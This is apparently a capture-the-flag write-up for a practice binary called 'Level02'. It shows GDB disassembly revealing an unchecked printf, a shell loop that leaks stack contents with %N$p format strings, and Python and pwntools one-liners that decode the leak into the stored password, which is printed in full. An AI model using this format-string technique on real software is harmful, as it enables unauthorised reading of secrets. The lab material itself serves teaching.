# Level02

First step - testing the program

    $ ./level02 
    ===== [ Secure Access System v1.0 ] =====
    /***************************************\
    | You must login to access this system. |
    \**************************************/
    --[ Username: coucou
    --[ Password: coucou
    *****************************************
    coucou does not have access!

Ask a username and password

Start in GDB

Lot of things, fopen and fread on the password file. And we can see a format string at `main+654`. The printf call a variable directly

    0x0000000000400a96 <+642>:	lea    rax,[rbp-0x70]
    0x0000000000400a9a <+646>:	mov    rdi,rax
    0x0000000000400a9d <+649>:	mov    eax,0x0
    0x0000000000400aa2 <+654>:	call   0x4006c0 <printf@plt>

Try to print the stack with this format string

    $ for(( i = 1; i < 42; i++)); do echo "$i - %$i\$p" | ./level02 | grep does; done

    1 - 0x7fffffffe3e0 does not have access!
    .....
    22 - 0x756e505234376848 does not have access!
    23 - 0x45414a3561733951 does not have access!
    24 - 0x377a7143574e6758 does not have access!
    25 - 0x354a35686e475873 does not have access!
    26 - 0x48336750664b394d does not have access!
    .....
    40 - 0x2900000000 does not have access!
    41 - 0x602010 does not have access!

We can see something interesting starting at position 22, like a long string

Convert the strings in hex

    $ python -c 'print "756e505234376848".decode("hex")[::-1]'
    Hh74RPnu
    $ python -c 'print "45414a3561733951".decode("hex")[::-1]'
    Q9sa5JAE
    $ python -c 'print "377a7143574e6758".decode("hex")[::-1]'
    XgNWCqz7
    $ python -c 'print "354a35686e475873".decode("hex")[::-1]'
    sXGnh5J5
    $ python -c 'print "48336750664b394d".decode("hex")[::-1]'
    M9KfPg3H

It's very similar to a password, concate all the strings and try

`Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H`

Good!

We can do it faster with the python pwntools library

    python -c 'from pwn import *; print p64(0x756e505234376848) + p64(0x45414a3561733951) + p64(0x377a7143574e6758) + p64(0x354a35686e475873) + p64(0x48336750664b394d)'
